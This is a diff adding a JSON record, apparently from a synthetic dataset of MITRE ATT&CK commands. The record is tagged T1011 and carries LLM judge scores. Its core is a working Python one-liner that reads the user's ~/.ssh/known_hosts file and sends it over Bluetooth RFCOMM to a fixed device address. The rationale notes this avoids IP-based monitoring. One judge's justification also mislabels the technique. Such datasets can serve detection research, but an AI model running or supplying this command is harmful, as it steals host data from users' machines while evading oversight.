@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('24:71:89:5A:BC:10', 19)); p=os.path.expanduser('~/.ssh/known_hosts'); s.sendall(open(p,'rb').read()); s.close()\"",
+  "explanation": "Exfiltrates user-accessible SSH host metadata over Bluetooth RFCOMM (an alternate network medium) rather than the primary IP channel, aligning with T1011.",
+  "rationale_steps": [
+    "Select Bluetooth RFCOMM as a non-IP medium per T1011.",
+    "Open a user-level RFCOMM socket to a nonstandard channel (19).",
+    "Read ~/.ssh/known_hosts and transmit bytes over RFCOMM.",
+    "Close the socket to minimize observable artifacts in IP-based monitoring."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-71de9821",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The one-liner is valid Python with balanced quotes/parentheses, proper semicolon separators, and correct socket API usage for Bluetooth RFCOMM.",
+        "semantic_score": 5,
+        "semantic_justification": "It automatically reads ~/.ssh/known_hosts and transmits it over a Bluetooth RFCOMM socket to a target address/channel, achieving automated exfiltration via an alternate network medium consistent with T1011.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:55:48.360506Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and proper syntax for socket programming, file operations, and string handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command successfully implements automated exfiltration by reading SSH known_hosts data and transmitting it over Bluetooth RFCOMM protocol to a specific Bluetooth MAC address, which aligns perfectly with T1011 as it uses an alternative protocol for data exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:55:51.542647Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, valid syntax for imports, socket creation, connection, file operations, and function calls.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely achieves the claimed intent of exfiltrating SSH host metadata over a Bluetooth RFCOMM channel, aligning perfectly with T1011 Automated Exfiltration via an alternate network medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:35:44.698274Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
